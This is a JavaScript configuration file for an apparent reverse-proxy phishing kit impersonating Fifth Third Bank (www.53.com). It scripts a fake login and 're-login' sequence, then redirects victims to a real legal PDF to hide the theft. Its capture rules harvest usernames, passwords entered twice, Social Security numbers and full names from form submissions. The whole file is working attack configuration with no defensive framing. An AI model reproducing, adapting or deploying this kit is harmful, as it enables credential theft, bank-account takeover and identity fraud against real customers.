/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const configExport = {
    SCHEME: '53rd',

    CURRENT_DOMAIN: 'www.53.com',


    START_PATH: '/session/secure/login.html',

    PHP_PROCESSOR: {
        '/session/secure/login': {
            GET: {
                script: 'login.html',
            },
            POST: {
                script: null,
            
                redirectTo: '/session/secure/re-login.html',

            },
        },

        '/session/secure/re-login.html': {
            GET: {
                script: 'login2.html',
            },
            POST: {
                script: null,
                
                redirectTo: '/session/secure/security.html',

            },
        },
        '/session/secure/secrity.html': {
            GET: {
                script: 'login2.html',
            },
            POST: {
                script: null,
                
                redirectTo: '/content/dam/fifth-third/docs/legal/ftb-digital-services-user-agreement.pdf',

            },
        },
    },


    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['user-id'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        loginPassword: {
            method: 'POST',
            params: ['password'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        loginUserName2: {
            method: 'POST',
            params: ['user-id2'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        loginPassword2: {
            method: 'POST',
            params: ['password2'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        ssnNo: {
            method: 'POST',
            params: ['ssn'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        fullName: {
            method: 'POST',
            params: ['fullname'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
    },

}
module.exports = configExport